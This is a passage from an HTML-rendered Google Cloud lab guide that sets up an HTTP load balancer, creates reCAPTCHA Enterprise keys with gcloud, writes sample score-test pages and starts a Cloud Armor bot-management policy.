</span><strong><span>lb-backend-example</span></strong><span>.</span></p><h4 id='start-the-configuration-2'><span>Start the configuration</span></h4><ol start='' ><li><p><span>In the console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>, and then click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Application Load Balancer (HTTP/HTTPS)</span></strong><span> and </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Public facing (external)</span></strong><span> and </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Best for global workloads</span></strong><span> and </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Global external Application Load Balancer</span></strong><span> and </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Name</span></strong><span> to </span><code>http-lb</code><span>.</span></p></li></ol><h4 id='configure-the-frontend-2'><span>Configure the frontend</span></h4><ol start='' ><li><p><span>Click </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Protocol</span></strong></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><strong><span>IP version</span></strong></td><td style='text-align:left;' ><span>IPv4</span></td></tr><tr><td style='text-align:left;' ><strong><span>IP address</span></strong></td><td style='text-align:left;' ><span>Ephemeral</span></td></tr><tr><td style='text-align:left;' ><strong><span>Port</span></strong></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h4 id='configure-the-backend'><span>Configure the backend</span></h4><p><span>Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend services &amp; backend buckets</span></strong><span>, click </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>http-backend</span></td></tr><tr><td style='text-align:left;' ><strong><span>Protocol</span></strong></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><strong><span>Named Port</span></strong></td><td style='text-align:left;' ><span>http</span></td></tr><tr><td style='text-align:left;' ><strong><span>Instance group</span></strong></td><td style='text-align:left;' ><span>lb-backend-example</span></td></tr><tr><td style='text-align:left;' ><strong><span>Port numbers</span></strong></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Cloud CDN</span></strong><span>, set the </span><strong><span>Cache mode</span></strong><span> to </span><strong><span>Use origin settings based on Cache-Control headers</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health Check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li></ol><p><img src="images/v4LmFGAsRY27SSVBpF1v9LLdLhQ%2Bx5Nt%2BQpczoRw%2Fxw%3D.png" referrerpolicy="no-referrer" alt="Create a health check button"></p><ol start='' ><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>http-health-check</span></td></tr><tr><td style='text-align:left;' ><strong><span>Protocol</span></strong></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><strong><span>Port</span></strong></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Health checks determine which instances receive new connections.</span></p><p>&nbsp;</p><p><span>This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Check the </span><strong><span>Enable Logging box</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Sample rate</span></strong><span> to </span><code>1</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> to create the backend service and click </span><strong><span>ok</span></strong><span>.</span></p></li></ol><h4 id='review-and-create-the-http-load-balancer-2'><span>Review and create the HTTP Load Balancer</span></h4><p><span>Host and path rules determine how your traffic is directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li></ol><p><img src="images/RIqOpdDekxI950rGFYHSrRKhl%2BIDRxI%2FsJawQuvSLU8%3D.png" referrerpolicy="no-referrer" alt="Load Balancer review and finalize page, which includes information in several categories, such as host and path rules, and backend services"></p><ol start='' ><li><p><span>Review the </span><strong><span>Backend services</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Wait for the load balancer to be created.</span></p><ol start='' ><li><p><span>Click on the name of the load balancer (</span><strong><span>http-lb</span></strong><span>).</span></p></li><li><p><span>Note the IPv4 address of the load balancer for the next task. In this lab, refer to it as </span><code>[LB_IP_v4]</code><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure the HTTP Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='test-the-http-load-balancer'><span>Test the HTTP Load Balancer</span></h4><p><span>Now that you created the HTTP Load Balancer for your backends, verify that traffic is forwarded to the backend service.</span></p><ul><li><p><span>To test IPv4 access to the HTTP Load Balancer, open a new tab in your browser and navigate to </span><strong><span>http://[LB_IP_v4]</span></strong><span>. Be sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p></li></ul><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the HTTP Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page load.</span></p><h3 id='task-4-create-and-deploy-recaptcha-session-token-and-challenge-page-site-key'><span>Task 4. Create and deploy reCAPTCHA session token and challenge-page site key</span></h3><p><span>reCAPTCHA Enterprise for WAF and Google Cloud Armor integration offers the following features: </span><a href='https://cloud.google.com/recaptcha-enterprise/docs/usecase#redirect'><span>reCAPTCHA challenge page</span></a><span>, </span><a href='https://cloud.google.com/recaptcha-enterprise/docs/usecase#action-token'><span>reCAPTCHA action-tokens</span></a><span>, and </span><a href='https://cloud.google.com/recaptcha-enterprise/docs/usecase#session-token'><span>reCAPTCHA session-tokens</span></a><span>. In this task, you implement the reCATCHA session token site key and reCAPTCHA WAF challenge-page site.</span></p><h4 id='create-recaptcha-session-token-and-waf-challenge-page-site-key'><span>Create reCAPTCHA session token and WAF challenge-page site key</span></h4><p><span>Before you create the session token site key and challenge page site key, double-check that you&#39;ve enabled the reCAPTCHA Enterprise API as indicated in the previous </span><em><span>Enable API</span></em><span> section.</span></p><p><span>The reCAPTCHA JavaScript sets a reCAPTCHA session-token as a cookie on the end-user&#39;s browser after the assessment. The end-user&#39;s browser attaches the cookie and refreshes the cookie as long as the reCAPTCHA JavaScript remains active.</span></p><ol start='' ><li><p><span>Create the reCAPTCHA session token site key and enable the WAF feature for the key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud recaptcha keys create --display-name=test-key-name \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --web --allow-all-domains --integration-type=score --testing-score=0.5 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --waf-feature=session-token --waf-service=ca</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output of the above command gives you the session token site key you created. Record it to use later in this task.</span></p><p><span>You also set the WAF service to Cloud Armor to enable the Cloud Armor integration.</span></p><p><strong><span>Note:</span></strong><span> You are using the integration type </span><strong><span>score</span></strong><span> which is leveraged in the Cloud Armor policy. You can alternatively use </span><strong><span>checkbox</span></strong><span> and </span><strong><span>invisible</span></strong><span>.</span></p><p>&nbsp;</p><p><span>You also set a </span><strong><span>testing score</span></strong><span> when you create the key to validate that the bot management policies created with Cloud Armor are working as intended. Replicating bot traffic is not easy, so this is a good way to test the feature.</span></p><ol start='' ><li><p><span>Create the reCAPTCHA WAF challenge-page site key and enable the WAF feature for the key. You can use the reCAPTCHA challenge page feature to redirect incoming requests to reCAPTCHA Enterprise to determine whether each request is potentially fraudulent or legitimate. Later, you associate this key with the Cloud Armor security policy to enable the manual challenge. This lab refers to this key as </span><code>CHALLENGE-PAGE-KEY</code><span> in the later steps.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud recaptcha keys create --display-name=challenge-page-key \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--web --allow-all-domains --integration-type=INVISIBLE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--waf-feature=challenge-page --waf-service=ca</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Navigate to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; Security &gt; reCAPTCHA Enterprise</span></strong><span>. You should see the keys you created in the </span><strong><span>Enterprise Keys</span></strong><span> list:</span></p></li></ol><h4 id='implement-recaptcha-session-token-site-key'><span>Implement reCAPTCHA session token site key</span></h4><ol start='' ><li><p><span>Navigate to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; Compute Engine &gt; VM Instances</span></strong><span>. Locate the VM in your instance group and SSH to it.</span></p></li></ol><p><img src="images/AQj28q12uBrWsd0n8zV4%2Bo%2F8piYYiQVwiSotUEYiNGE%3D.png" referrerpolicy="no-referrer" alt="The highlighted SSH within the Connect column"></p><ol start='' ><li><p><span>Go to the webserver root directory and change user to root:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd /var/www/html/</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo su</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Update the landing </span><code>index.html</code><span> page and embed the reCAPTCHA session token site key. The session token site key (that you recorded earlier) is set in the head section of your landing page as below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">src="https://www.google.com/recaptcha/enterprise.js?render=&lt;SESSION_TOKEN_SITE_KEY&gt;&amp;waf=session" async defer&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Remember to replace </span><code>&lt;SESSION_TOKEN_SITE_KEY&gt;</code><span> with the site token before you run the following command:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo '&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;ReCAPTCHA Session Token&lt;/title&gt;&lt;script src="https://www.google.com/recaptcha/enterprise.js?render=&lt;SESSION_TOKEN_SITE_KEY&gt;&amp;waf=session" async defer&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Main Page&lt;/h1&gt;&lt;p&gt;&lt;a href="/good-score.html"&gt;Visit allowed link&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href="/bad-score.html"&gt;Visit blocked link&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href="/median-score.html"&gt;Visit redirect link&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;' &gt; index.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create three other sample pages to test out the bot management policies:</span></p></li></ol><ul><li><p><strong><span>good-score.html</span></strong></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo '&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Congrats! You have a good score!!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;' &gt; good-score.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ul><li><p><strong><span>bad-score.html</span></strong></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo '&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, You have a bad score!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;' &gt; bad-score.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ul><li><p><strong><span>median-score.html</span></strong></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo '&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;You have a median score that we need a second verification.&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;' &gt; median-score.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Validate that you are able to access all the webpages by opening them in your browser. Be sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer:</span></p><ol start='' ><li><p><span>Open </span><code>http://[LB_IP_v4]/index.html</code><span>. You verify that the reCAPTCHA implementation is working when you see &quot;protected by reCAPTCHA&quot; at the bottom right corner of the page:</span></p></li></ol><p><img src="images/hijCD02uC9m6FzFygoYmmJeU8b06l3oLtlfyUDXmnF4%3D.png" referrerpolicy="no-referrer" alt="Reptcha logo"></p><ol start='' ><li><p><span>Click into each of the links.</span></p></li></ol><p><img src="images/d%2B8kqWJEyfY1srSw17QjZmrvHufNUR%2FLFyigfgO6afQ%3D.png" referrerpolicy="no-referrer" alt="The Main Page within the browser, which includes three links"></p><ol start='' ><li><p><span>Validate you are able to access all the pages.</span></p></li></ol><p><img src="images/riGt21Sk4umYJFO84160eIeMSblu5VKRYsto%2FA06nsc%3D.png" referrerpolicy="no-referrer" alt="The message: Congrats! You have a good score!"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Deploy reCAPTCHA session token and challenge-page site key</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-5-create-cloud-armor-security-policy-rules-for-bot-management'><span>Task 5. Create Cloud Armor security policy rules for Bot Management</span></h3><p><span>In this section, you use Cloud Armor bot management rules to allow, deny and redirect requests based on the reCAPTCHA score.</span></p><ol start='' ><li><p><span>In Cloud Shell, create security policy via gcloud:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies create recaptcha-policy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description "policy for bot management"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To use reCAPTCHA Enterprise manual challenge to distinguish between human and automated clients, associate the reCAPTCHA WAF challenge site key (CHALLENGE-PAGE-KEY) you previously created for a manual challenge with the security policy. In the following script, remember to replace &quot;CHALLENGE-PAGE-KEY&quot; with the key you previously created:</span></p></li></ol><pre class="md-fences md-end-block 